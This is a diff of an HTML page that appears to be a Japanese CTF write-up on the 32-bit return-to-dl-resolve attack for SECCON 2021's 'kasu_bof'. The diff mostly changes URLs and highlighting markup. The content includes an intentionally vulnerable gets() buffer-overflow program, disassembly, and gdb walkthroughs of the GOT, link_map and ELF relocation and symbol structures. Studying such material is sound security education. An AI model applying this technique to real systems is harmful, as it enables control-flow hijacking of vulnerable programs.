@@ -15,22 +15,22 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css" integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin="anonymous" />
 
 
-<link rel="stylesheet" href="https://team-enu.github.io/css/palettes/base16-dark.css">
-<link rel="stylesheet" href="https://team-enu.github.io/css/risotto.css">
-<link rel="stylesheet" href="https://team-enu.github.io/css/custom.css">
+<link rel="stylesheet" href="/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="/css/risotto.css">
+<link rel="stylesheet" href="/css/custom.css">
 </head>
 
     <body>
         <div class="page">
 
-            <header class="page__header"><h1 class="page__logo"><a href="https://team-enu.github.io" class="page__logo-inner">Team Enu</a></h1>
+            <header class="page__header"><h1 class="page__logo"><a href="/" class="page__logo-inner">Team Enu</a></h1>
 <nav class="page__nav main-nav">
     <ul>
     
     
-    <li class="main-nav__item"><a class="nav-main-item" href="https://team-enu.github.io/writeups/" title="">Writeups</a></li>
+    <li class="main-nav__item"><a class="nav-main-item" href="/writeups/" title="">Writeups</a></li>
     
-    <li class="main-nav__item"><a class="nav-main-item" href="https://team-enu.github.io/news/" title="">News</a></li>
+    <li class="main-nav__item"><a class="nav-main-item" href="/news/" title="">News</a></li>
     
     </ul>
 </nav>
@@ -74,13 +74,13 @@ Do you understand return-to-dl-resolve attack on 32-bit?
 </h5>
 <div id="outline-text-headline-4" class="outline-text-5">
 <div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x80</span>];
-</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gets</span>(buf);
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+    <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+      <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0x80</span>];
+      gets(buf);
+      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }</code></pre></div>
 </div>
 </div>
 </div>
@@ -157,44 +157,44 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <div id="outline-text-headline-8" class="outline-text-4">
 <p>問題のプログラムをディスアセンブルし、どのようにして <code>gets</code> が呼び出されているのか確認してみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>08049180 &lt;main&gt;:
-</span></span><span style="display:flex;"><span>8049180:       55                      push   ebp
-</span></span><span style="display:flex;"><span>8049181:       89 e5                   mov    ebp,esp
-</span></span><span style="display:flex;"><span>8049183:       81 ec 98 00 00 00       sub    esp,0x98
-</span></span><span style="display:flex;"><span>8049189:       8d 85 7c ff ff ff       lea    eax,[ebp-0x84]
-</span></span><span style="display:flex;"><span>804918f:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0
-</span></span><span style="display:flex;"><span>8049196:       89 04 24                mov    DWORD PTR [esp],eax
-</span></span><span style="display:flex;"><span>8049199:       e8 a2 fe ff ff          call   8049040 &lt;gets@plt&gt;
-</span></span><span style="display:flex;"><span>804919e:       31 c9                   xor    ecx,ecx
-</span></span><span style="display:flex;"><span>80491a0:       89 85 78 ff ff ff       mov    DWORD PTR [ebp-0x88],eax
-</span></span><span style="display:flex;"><span>80491a6:       89 c8                   mov    eax,ecx
-</span></span><span style="display:flex;"><span>80491a8:       81 c4 98 00 00 00       add    esp,0x98
-</span></span><span style="display:flex;"><span>80491ae:       5d                      pop    ebp
-</span></span><span style="display:flex;"><span>80491af:       c3                      ret</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049180 &lt;main&gt;:
+8049180:       55                      push   ebp
+8049181:       89 e5                   mov    ebp,esp
+8049183:       81 ec 98 00 00 00       sub    esp,0x98
+8049189:       8d 85 7c ff ff ff       lea    eax,[ebp-0x84]
+804918f:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-0x4],0x0
+8049196:       89 04 24                mov    DWORD PTR [esp],eax
+8049199:       e8 a2 fe ff ff          call   8049040 &lt;gets@plt&gt;
+804919e:       31 c9                   xor    ecx,ecx
+80491a0:       89 85 78 ff ff ff       mov    DWORD PTR [ebp-0x88],eax
+80491a6:       89 c8                   mov    eax,ecx
+80491a8:       81 c4 98 00 00 00       add    esp,0x98
+80491ae:       5d                      pop    ebp
+80491af:       c3                      ret</code></pre></div>
 </div>
 <p>ディスアセンブルした <code>main</code> を見てみると、 <code>0x8049199</code> のアドレスにおいて、 <code>gets@plt</code> である <code>0x8049040</code> にジャンプしている。
     <code>gets@plt</code> は、 <code>.plt</code> セクションに存在するため、 <code>.plt</code> セクションもディスアセンブルしてみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>08049040 &lt;gets@plt&gt;:
-</span></span><span style="display:flex;"><span>8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
-</span></span><span style="display:flex;"><span>8049046:       ...</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049040 &lt;gets@plt&gt;:
+8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
+8049046:       ...</code></pre></div>
 </div>
 <p>先程呼ばれた <code>gets@plt</code> を確認してみると、 まず <code>jmp    DWORD PTR ds:0x804c00c</code> で <code>0x804c00c</code> 番地に格納されたアドレスへジャンプしている。
     この <code>0x804c00c</code> のアドレスは、GOTと呼ばれる領域にあり、最終的に解決された <code>gets</code> のアドレスが格納される。</p>
 <p>
     そこで、1回目の <code>gets@plt</code> の呼び出し時に、GOTには何が格納されているのか確認してみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  hexdump  dword 0x804c00c
-</span></span><span style="display:flex;"><span>0x0804c00c│+0x0000   &lt;gets@got.plt+0000&gt; 0x08049046   
-</span></span><span style="display:flex;"><span>0x0804c010│+0x0004   ...</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  hexdump  dword 0x804c00c
+0x0804c00c│+0x0000   &lt;gets@got.plt+0000&gt; 0x08049046   
+0x0804c010│+0x0004   ...</code></pre></div>
 </div>
 <p>
     すると、 <code>0x804c00c</code> には、次の命令のアドレス ( <code>0x8049046</code> )がGOTに格納されていることがわかる。
     このため、引き続き <code>0x8049046</code> からの命令読んでいく。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>08049030 &lt;.plt&gt;:
-</span></span><span style="display:flex;"><span>8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
-</span></span><span style="display:flex;"><span>8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">08049030 &lt;.plt&gt;:
+8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
+8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008</code></pre></div>
 </div>
 <p>次の命令 <code>push   0x0</code> では、スタックに <code>0x0</code> を積み、その後 <code>jmp    8049030 &lt;.plt&gt;</code> で <code>.plt</code> セクションの先頭にジャンプしている。</p>
 <p>
@@ -203,9 +203,9 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <p>
     ここで、 <code>0x804c004</code> および <code>0x804c008</code> 番地には何が格納されているのか調べてみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  hexdump dword 0x804c004
-</span></span><span style="display:flex;"><span>0x0804c004│+0x0000   &lt;_GLOBAL_OFFSET_TABLE_+0004&gt; 0xf7ffd990   
-</span></span><span style="display:flex;"><span>0x0804c008│+0x0004   &lt;_GLOBAL_OFFSET_TABLE_+0008&gt; 0xf7fe7ac0</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  hexdump dword 0x804c004
+0x0804c004│+0x0000   &lt;_GLOBAL_OFFSET_TABLE_+0004&gt; 0xf7ffd990   
+0x0804c008│+0x0004   &lt;_GLOBAL_OFFSET_TABLE_+0008&gt; 0xf7fe7ac0</code></pre></div>
 </div>
 <p>すると、これらのアドレスはGOT先頭付近のアドレスであり、それぞれ <code>0xf7ffd990</code> と <code>0xf7fe7ac0</code> の値が格納されていることがわかる。</p>
 <p>
@@ -243,32 +243,32 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <p>
   gdbから、構造体の定義を得るために、libcにおけるデバッグ情報を取得しておく。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>$ sudo apt install libc6-dbg libc6-dbg:i386</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$ sudo apt install libc6-dbg libc6-dbg:i386</code></pre></div>
 </div>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  break main
-</span></span><span style="display:flex;"><span>gef➤  run
-</span></span><span style="display:flex;"><span>gef➤  info types Elf32_Dyn
-</span></span><span style="display:flex;"><span>All types matching regular expression &#34;Elf32_Dyn&#34;:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../elf/elf.h:
-</span></span><span style="display:flex;"><span>838:    typedef struct {...} Elf32_Dyn;gef➤  info types Elf32_Dyn
-</span></span><span style="display:flex;"><span>All types matching regular expression &#34;Elf32_Dyn&#34;:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../elf/elf.h:
-</span></span><span style="display:flex;"><span>838:    typedef struct {...} Elf32_Dyn;
-</span></span><span style="display:flex;"><span>gef➤  ptype /o Elf32_Dyn
-</span></span><span style="display:flex;"><span>type = struct {
-</span></span><span style="display:flex;"><span>/*    0      |     4 */    Elf32_Sword d_tag;
-</span></span><span style="display:flex;"><span>/*    4      |     4 */    union {
-</span></span><span style="display:flex;"><span>/*                 4 */        Elf32_Word d_val;
-</span></span><span style="display:flex;"><span>/*                 4 */        Elf32_Addr d_ptr;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                            /* total size (bytes):    4 */
-</span></span><span style="display:flex;"><span>                        } d_un;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                        /* total size (bytes):    8 */
-</span></span><span style="display:flex;"><span>                      }</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  break main
+gef➤  run
+gef➤  info types Elf32_Dyn
+All types matching regular expression &#34;Elf32_Dyn&#34;:
+
+File ../elf/elf.h:
+838:    typedef struct {...} Elf32_Dyn;gef➤  info types Elf32_Dyn
+All types matching regular expression &#34;Elf32_Dyn&#34;:
+
+File ../elf/elf.h:
+838:    typedef struct {...} Elf32_Dyn;
+gef➤  ptype /o Elf32_Dyn
+type = struct {
+/*    0      |     4 */    Elf32_Sword d_tag;
+/*    4      |     4 */    union {
+/*                 4 */        Elf32_Word d_val;
+/*                 4 */        Elf32_Addr d_ptr;
+
+                            /* total size (bytes):    4 */
+                        } d_un;
+
+                        /* total size (bytes):    8 */
+                      }</code></pre></div>
 </div>
 <ul>
 <li>
@@ -290,15 +290,15 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <li>
 <p><a href="https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862">https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862</a></p>
 <div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* Legal values for d_tag (dynamic entry type).  */</span>
+...
+<span style="color:#75715e">#define DT_STRTAB	5		</span><span style="color:#75715e">/* Address of string table */</span><span style="color:#75715e">
+</span><span style="color:#75715e">#define DT_SYMTAB	6		</span><span style="color:#75715e">/* Address of symbol table */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">#define DT_REL	17		</span><span style="color:#75715e">/* Address of Rel relocs */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>...
+<span style="color:#75715e">#define DT_JMPREL	23		</span><span style="color:#75715e">/* Address of PLT relocs */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>...</code></pre></div>
 </div>
 </li>
 </ul>
@@ -314,31 +314,31 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <p>
    それでは、 <code>link_map</code> 構造体の構造を知るために、gdbを用いて定義を参照してみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  info types link_map
-</span></span><span style="display:flex;"><span>All types matching regular expression &#34;link_map&#34;:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../elf/link.h:
-</span></span><span style="display:flex;"><span>84:	struct link_map_public;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../include/link.h:
-</span></span><span style="display:flex;"><span>91:	struct link_map;
-</span></span><span style="display:flex;"><span>271:	struct link_map_reldeps;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../sysdeps/x86/linkmap.h:
-</span></span><span style="display:flex;"><span>10:	struct link_map_machine;
-</span></span><span style="display:flex;"><span>gef➤  ptype /o struct link_map
-</span></span><span style="display:flex;"><span>/* offset    |  size */  type = struct link_map {
-</span></span><span style="display:flex;"><span>/*    0      |     4 */    Elf32_Addr l_addr;
-</span></span><span style="display:flex;"><span>/*    4      |     4 */    char *l_name;
-</span></span><span style="display:flex;"><span>/*    8      |     4 */    Elf32_Dyn *l_ld;
-</span></span><span style="display:flex;"><span>/*   12      |     4 */    struct link_map *l_next;
-</span></span><span style="display:flex;"><span>/*   16      |     4 */    struct link_map *l_prev;
-</span></span><span style="display:flex;"><span>/*   20      |     4 */    struct link_map *l_real;
-</span></span><span style="display:flex;"><span>/*   24      |     4 */    Lmid_t l_ns;
-</span></span><span style="display:flex;"><span>/*   28      |     4 */    struct libname_list *l_libname;
-</span></span><span style="display:flex;"><span>/*   32      |   308 */    Elf32_Dyn *l_info[77];
-</span></span><span style="display:flex;"><span>/*  340      |     4 */    const Elf32_Phdr *l_phdr;
-</span></span><span style="display:flex;"><span>...</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types link_map
+All types matching regular expression &#34;link_map&#34;:
+
+File ../elf/link.h:
+84:	struct link_map_public;
+
+File ../include/link.h:
+91:	struct link_map;
+271:	struct link_map_reldeps;
+
+File ../sysdeps/x86/linkmap.h:
+10:	struct link_map_machine;
+gef➤  ptype /o struct link_map
+/* offset    |  size */  type = struct link_map {
+/*    0      |     4 */    Elf32_Addr l_addr;
+/*    4      |     4 */    char *l_name;
+/*    8      |     4 */    Elf32_Dyn *l_ld;
+/*   12      |     4 */    struct link_map *l_next;
+/*   16      |     4 */    struct link_map *l_prev;
+/*   20      |     4 */    struct link_map *l_real;
+/*   24      |     4 */    Lmid_t l_ns;
+/*   28      |     4 */    struct libname_list *l_libname;
+/*   32      |   308 */    Elf32_Dyn *l_info[77];
+/*  340      |     4 */    const Elf32_Phdr *l_phdr;
+...</code></pre></div>
 </div>
 <ul>
 <li>
@@ -356,15 +356,15 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <p>
    <code>_dl_runtime_resolve</code> の第一引数である <code>0xf7ffd990</code> は <code>link_map</code> 構造体のアドレスであるため、 <code>0xf7ffd990</code> を <code>link_map</code> 構造体のアドレスとし、表示する。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  set $link_map = (struct link_map*) 0xf7ffd990
-</span></span><span style="display:flex;"><span>gef➤  print *$link_map.l_info[23]
-</span></span><span style="display:flex;"><span>$5 = {
-</span></span><span style="display:flex;"><span>d_tag = 0x17,
-</span></span><span style="display:flex;"><span>d_un = {
-</span></span><span style="display:flex;"><span> d_val = 0x80482d8,
-</span></span><span style="display:flex;"><span> d_ptr = 0x80482d8
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $link_map = (struct link_map*) 0xf7ffd990
+gef➤  print *$link_map.l_info[23]
+$5 = {
+d_tag = 0x17,
+d_un = {
+ d_val = 0x80482d8,
+ d_ptr = 0x80482d8
+}
+}</code></pre></div>
 </div>
 <p>
    すると <code>link_map</code> 構造体のそれぞれのメンバの値が確認できる。
@@ -385,19 +385,19 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <p>
   <code>rel.plt</code> セクションは、 <code>Elf32_Rel</code> 構造体の配列となっており、 <code>Elf32_Rel</code> 構造体の定義は以下のようになっている。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  info types Elf32_Rel
-</span></span><span style="display:flex;"><span>All types matching regular expression &#34;Elf32_Rel&#34;:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../elf/elf.h:
-</span></span><span style="display:flex;"><span>638:    typedef struct {...} Elf32_Rel;
-</span></span><span style="display:flex;"><span>658:    typedef struct {...} Elf32_Rela;
-</span></span><span style="display:flex;"><span>gef➤  ptype /o Elf32_Rel
-</span></span><span style="display:flex;"><span>type = struct {
-</span></span><span style="display:flex;"><span>/*    0      |     4 */    Elf32_Addr r_offset;
-</span></span><span style="display:flex;"><span>/*    4      |     4 */    Elf32_Word r_info;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                         /* total size (bytes):    8 */
-</span></span><span style="display:flex;"><span>                       }</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Rel
+All types matching regular expression &#34;Elf32_Rel&#34;:
+
+File ../elf/elf.h:
+638:    typedef struct {...} Elf32_Rel;
+658:    typedef struct {...} Elf32_Rela;
+gef➤  ptype /o Elf32_Rel
+type = struct {
+/*    0      |     4 */    Elf32_Addr r_offset;
+/*    4      |     4 */    Elf32_Word r_info;
+
+                         /* total size (bytes):    8 */
+                       }</code></pre></div>
 </div>
 <ul>
 <li>
@@ -411,13 +411,13 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 </li>
 </ul>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  set $reloc_arg = 0x0
-</span></span><span style="display:flex;"><span>gef➤  set $reloc = (Elf32_Rel *)($link_map.l_info[23].d_un.d_ptr + $reloc_arg)
-</span></span><span style="display:flex;"><span>gef➤  print *reloc
-</span></span><span style="display:flex;"><span>$11 = {
-</span></span><span style="display:flex;"><span>r_offset = 0x804c00c,
-</span></span><span style="display:flex;"><span>r_info = 0x107
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  set $reloc_arg = 0x0
+gef➤  set $reloc = (Elf32_Rel *)($link_map.l_info[23].d_un.d_ptr + $reloc_arg)
+gef➤  print *reloc
+$11 = {
+r_offset = 0x804c00c,
+r_info = 0x107
+}</code></pre></div>
 </div>
 <p>
     ここで、 <code>r_offset</code> はライブラリ関数のアドレスを解決後に、そのアドレスを格納するGOT領域のエントリとなる。
@@ -426,11 +426,11 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
     <code>r_info</code> は、その下位8bitと残りの上位24bitそれぞれに、次のような値を保持する。
     <code>r_info</code> を 8 byte 右シフトすることにより、 <code>.dynsym</code> のインデックスを取得することができる。</p>
 <div class="src src-c">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/* How to extract and insert information held in the r_info field.  */</span>
+
+<span style="color:#75715e">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
+</span><span style="color:#75715e">#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
+</span><span style="color:#75715e">#define ELF32_R_INFO(sym, type)	(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></code></pre></div>
 </div>
 </div>
 </div>
@@ -445,22 +445,22 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 <p>
      <code>Elf32_Sym</code> 構造体をgdbで参照してみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  info types Elf32_Sym
-</span></span><span style="display:flex;"><span>All types matching regular expression &#34;Elf32_Sym&#34;:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>File ../elf/elf.h:
-</span></span><span style="display:flex;"><span>527:    typedef struct {...} Elf32_Sym;
-</span></span><span style="display:flex;"><span>gef➤  ptype /o Elf32_Sym
-</span></span><span style="display:flex;"><span>type = struct {
-</span></span><span style="display:flex;"><span>/*    0      |     4 */    Elf32_Word st_name;
-</span></span><span style="display:flex;"><span>/*    4      |     4 */    Elf32_Addr st_value;
-</span></span><span style="display:flex;"><span>/*    8      |     4 */    Elf32_Word st_size;
-</span></span><span style="display:flex;"><span>/*   12      |     1 */    unsigned char st_info;
-</span></span><span style="display:flex;"><span>/*   13      |     1 */    unsigned char st_other;
-</span></span><span style="display:flex;"><span>/*   14      |     2 */    Elf32_Section st_shndx;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                      /* total size (bytes):   16 */
-</span></span><span style="display:flex;"><span>                    }</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">gef➤  info types Elf32_Sym
+All types matching regular expression &#34;Elf32_Sym&#34;:
+
+File ../elf/elf.h:
+527:    typedef struct {...} Elf32_Sym;
+gef➤  ptype /o Elf32_Sym
+type = struct {
+/*    0      |     4 */    Elf32_Word st_name;
+/*    4      |     4 */    Elf32_Addr st_value;
+/*    8      |     4 */    Elf32_Word st_size;
+/*   12      |     1 */    unsigned char st_info;
+/*   13      |     1 */    unsigned char st_other;
+/*   14      |     2 */    Elf32_Section st_shndx;
+
+                      /* total size (bytes):   16 */
+                    }</code></pre></div>
 </div>
 <ul>
 <li>
@@ -474,17 +474,17 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
      ここで、 <code>st_name</code> は、実際にシンボルが置かれている <code>.dynstr</code> セクションのオフセットを指している。
     そこで、 <code>r_info</code> からインデックスを計算し、実際に <code>Elf32_Sym</code> のアドレスを特定してみる。</p>
 <div class="src src-text">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>gef➤  set $symtab = (Elf32_Sym *)($link_map.l_info[6].d_un.d_ptr)
-</span></span><span style="display:flex;"><span>gef➤  set $sym = $symtab[$reloc.r_info&gt;&gt;8]
-</span></span><span style="display:flex;"><span>gef➤  print $sym
-</span></span><span style="display:flex;"><span>$13 = {
-</span></span><span style="display:flex;"><span>st_name = 0x1a,
-</span></span><span style="display:flex;"><span>st_value = 0x0,
-</span></span><span style="display:flex;"><span>st_size = 0x0,
-</span></span><span style="display:flex;"><span>st_info = 0x12,
-</span></span><span style="display:flex;"><span>st_other = 0x0,
-</span></span><span style="display:flex;"><span>st_shndx = 0x0
-</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
